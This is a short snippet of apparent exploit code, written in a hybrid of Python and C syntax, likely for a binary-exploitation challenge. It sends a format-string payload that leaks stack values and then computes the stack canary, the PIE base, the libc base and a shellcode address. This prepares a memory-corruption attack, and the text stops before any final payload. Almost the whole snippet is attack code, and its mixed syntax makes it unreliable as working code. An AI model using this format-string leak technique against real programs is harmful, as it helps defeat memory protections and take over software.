n = 100
s = "GO\n"
write(s)
if recv(4) == 0:
    n -= 1
else:
    s = "SHOUT %106$016lx.%114$016lx.%216$016lx.%116$016lx"
    send(s)
    a = strtok(s,'.')
    b = strtok(NULL,'.')
    c = strtok(NULL,'.')
    d = strtok(NULL,'.')
    canary = strtol(a,NULL,16)
    pie = strtol(b,NULL,16)
    pie_base = (pie&~0xFFF)-0x2000
    libc = strtol(c,NULL,16)
    libc_base = libc-0x2152
    stack = strtol(d,NULL,16)
    shellcode_base = stack-0x260+0x8

    
